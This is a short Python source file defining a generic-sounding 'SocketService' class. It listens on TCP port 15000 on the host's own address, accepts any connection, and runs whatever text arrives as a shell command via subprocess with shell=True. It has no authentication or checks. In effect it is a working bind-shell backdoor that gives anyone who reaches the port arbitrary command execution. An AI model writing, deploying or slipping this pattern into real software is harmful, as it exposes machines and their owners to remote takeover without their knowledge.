import socket
import subprocess

class SocketService(object):
    def __init__(self, sockserver=None):
        if sockserver is None:
            self.sockserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.namehost = socket.gethostname()
            self.host = socket.gethostbyname(socket.gethostname())
            self.port = 15000
            self.sockserver.bind((self.host, self.port))
            self.sockserver.listen(5)
        else:
            self.sockserver = sockserver
    

    def startsocket(self):
        print(self.namehost, self.host)
        while True:
            (self.clientsocket, self.address) = self.sockserver.accept()
            self.command = self.clientsocket.recv(1024).decode()
            print(self.command)
            subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE)
    
    def socketclose(self):
        self.sockserver.close()




